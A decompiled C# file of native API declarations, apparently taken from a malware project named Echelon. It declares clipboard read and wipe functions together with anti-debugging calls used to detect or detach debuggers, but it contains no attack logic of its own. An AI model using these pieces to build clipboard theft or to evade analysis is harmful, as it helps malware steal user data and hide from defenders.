using System;
using System.Runtime.InteropServices;
using Echelon.Global.Other;
using Echelon.Global.Other.WinStructs;

namespace Echelon.Global
{
	// Token: 0x0200005C RID: 92
	internal class NativeMethods
	{
		// Token: 0x0600021C RID: 540
		[DllImport("user32.dll")]
		internal static extern IntPtr GetClipboardData(uint uFormat);

		// Token: 0x0600021D RID: 541
		[DllImport("user32.dll")]
		public static extern bool IsClipboardFormatAvailable(uint format);

		// Token: 0x0600021E RID: 542
		[DllImport("user32.dll", SetLastError = true)]
		internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

		// Token: 0x0600021F RID: 543
		[DllImport("user32.dll", SetLastError = true)]
		internal static extern bool CloseClipboard();

		// Token: 0x06000220 RID: 544
		[DllImport("user32.dll")]
		internal static extern bool EmptyClipboard();

		// Token: 0x06000221 RID: 545
		[DllImport("kernel32.dll")]
		internal static extern IntPtr GlobalLock(IntPtr hMem);

		// Token: 0x06000222 RID: 546
		[DllImport("kernel32.dll")]
		internal static extern bool GlobalUnlock(IntPtr hMem);

		// Token: 0x06000223 RID: 547
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x06000224 RID: 548
		[DllImport("ntdll.dll")]
		public static extern NtStatus NtSetInformationThread(IntPtr ThreadHandle, ThreadInformationClass ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

		// Token: 0x06000225 RID: 549
		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

		// Token: 0x06000226 RID: 550
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CloseHandle(IntPtr handle);

		// Token: 0x06000227 RID: 551
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] PROCESSINFOCLASS ProcessInformationClass, out IntPtr ProcessInformation, [In] int ProcessInformationLength, [Optional] out int ReturnLength);

		// Token: 0x06000228 RID: 552
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtClose([In] IntPtr Handle);

		// Token: 0x06000229 RID: 553
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtRemoveProcessDebug(IntPtr ProcessHandle, IntPtr DebugObjectHandle);

		// Token: 0x0600022A RID: 554
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtSetInformationDebugObject([In] IntPtr DebugObjectHandle, [In] DebugObjectInformationClass DebugObjectInformationClass, [In] IntPtr DebugObjectInformation, [In] int DebugObjectInformationLength, [Optional] out int ReturnLength);

		// Token: 0x0600022B RID: 555
		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
		public static extern NtStatus NtQuerySystemInformation([In] SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, [In] int SystemInformationLength, [Optional] out int ReturnLength);

		// Token: 0x0600022C RID: 556
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

		// Token: 0x0600022D RID: 557
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsDebuggerPresent();
	}
}
